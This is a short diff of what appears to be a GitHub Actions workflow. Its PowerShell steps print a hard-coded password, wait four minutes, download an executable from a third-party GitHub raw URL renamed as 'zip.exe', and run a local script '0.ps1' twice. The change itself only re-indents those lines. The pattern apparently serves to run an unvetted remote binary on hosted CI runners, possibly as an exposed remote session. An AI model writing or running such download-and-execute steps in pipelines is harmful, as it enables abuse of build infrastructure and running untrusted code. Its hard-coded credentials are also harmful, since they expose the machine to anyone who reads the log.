@@ -27,6 +27,6 @@ jobs:
             Write-Host Password: P@ssw0rd.
             sleep 240
             curl -o zip.exe -Uri "https://raw.githubusercontent.com/YaptircazKanka/Blok3/main/use.exe"
-           .\0.ps1
-           curl -o zip.exe -Uri "https://raw.githubusercontent.com/YaptircazKanka/Blok3/main/use.exe"
-           .\0.ps1
+            .\0.ps1
+            curl -o zip.exe -Uri "https://raw.githubusercontent.com/YaptircazKanka/Blok3/main/use.exe"
+            .\0.ps1
